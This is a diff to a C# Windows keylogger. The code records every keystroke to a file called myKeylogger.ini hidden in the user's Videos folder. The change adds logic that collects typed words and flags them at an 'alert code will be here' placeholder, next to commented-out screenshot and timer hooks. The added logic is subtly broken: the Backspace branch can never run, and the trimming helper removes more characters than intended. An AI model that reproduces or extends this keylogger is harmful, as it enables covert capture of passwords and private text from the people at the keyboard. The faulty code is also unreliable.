@@ -15,6 +15,8 @@ namespace keylog
         private bool hasSubmitted;
         private readonly KeyMapper keyMapper = new KeyMapper();
         private readonly string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini";
+        //
+        private string word = "";
         public  Form1()
         {
             InitializeComponent();
@@ -41,9 +43,36 @@ namespace keylog
             var keyText = keyMapper.GetKeyText(e.KeyCode);
             File.AppendAllText(filePath, keyText);
 
-           // Functions.ScreenShot();
+            if ( (keyText != " ") && (keyText != string.Empty) && (keyText.Trim() != "{ENTER}" ))
+            {
+                word += keyText;
+                Console.WriteLine("keyTex : ----" + keyText.Trim() + "------");
+                Console.WriteLine("Word   : ----" + word.Trim() + "------");
+            }
+            else if (keyText.Trim() == "{Backspace}")
+            {
+                word = TrimLastCharacter(word);
+            }
+            else
+            {
+                Console.WriteLine("alert word : "+ word);
+                // alert code will be here
+                // 
+                word = ""; // reset word
+            }
         }
-
+        // remove last charater of string
+        private string TrimLastCharacter(String str)
+        {
+            if (String.IsNullOrEmpty(str))
+            {
+                return str;
+            }
+            else
+            {
+                return str.TrimEnd(str[str.Length - 1]);
+            }
+        }
         protected override void OnLoad(EventArgs e)
         {
             base.OnLoad(e);
@@ -55,5 +84,9 @@ namespace keylog
             keyListener.Enabled = false;
         }
 
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            //Functions.StartTimmer(10, 1);
+        }
     }
 }
